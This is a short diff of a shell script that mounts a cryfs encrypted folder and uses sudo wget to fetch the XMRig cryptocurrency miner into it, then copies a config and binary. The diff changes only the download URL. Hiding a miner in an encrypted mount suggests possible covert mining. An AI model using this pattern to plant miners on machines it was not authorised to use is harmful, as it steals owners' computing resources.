@@ -9,7 +9,7 @@ ecryptfs-setup-swap -f
 echo "#!/bin/bash
 sudo mkdir /home/fdsa/cr /home/fdsa/crd
 sudo cryfs /home/fdsa/cr /home/fdsa/crd
-sudo wget https://github.com/xmrig/xmrig/releases/download/v6.19.0/xmrig-6.19.0-linux-static-x64.tar.gz -O /home/fdsa/crd/xm.tar.gz
+sudo wget https://github.com/xmrig/xmrig/releases/download/v6.19.0/xmrig-6.19.0-focal-x64.tar.gz -O /home/fdsa/crd/xm.tar.gz
 sudo tar -xvzf /home/fdsa/crd/xm.tar.gz
 sudo cp /home/fdsa/xmrig-6.18.0/config.json /home/fdsa/crd/config.json
 sudo cp /home/fdsa/xmrig-6.18.0/xmrig /home/fdsa/crd/xmrig
